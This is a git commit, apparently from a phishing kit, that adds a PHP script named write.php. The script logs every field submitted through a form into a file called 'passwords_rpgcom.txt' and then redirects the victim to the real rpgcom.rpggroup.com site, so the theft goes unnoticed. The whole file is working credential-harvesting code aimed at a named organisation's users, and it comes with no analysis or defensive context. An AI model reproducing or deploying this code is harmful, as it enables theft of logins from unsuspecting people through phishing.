d0f372042aad5252730565f4266c6840ae1e002b
starmoon007009 <111562566+starmoon007009@users.noreply.github.com>
2022-08-19 13:03:44 +0530

    Add files via upload

---
+++ write.php
@@ -0,0 +1,13 @@
+<?php
+header("Location:https://rpgcom.rpggroup.com/");
+$handle = fopen("passwords_rpgcom.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
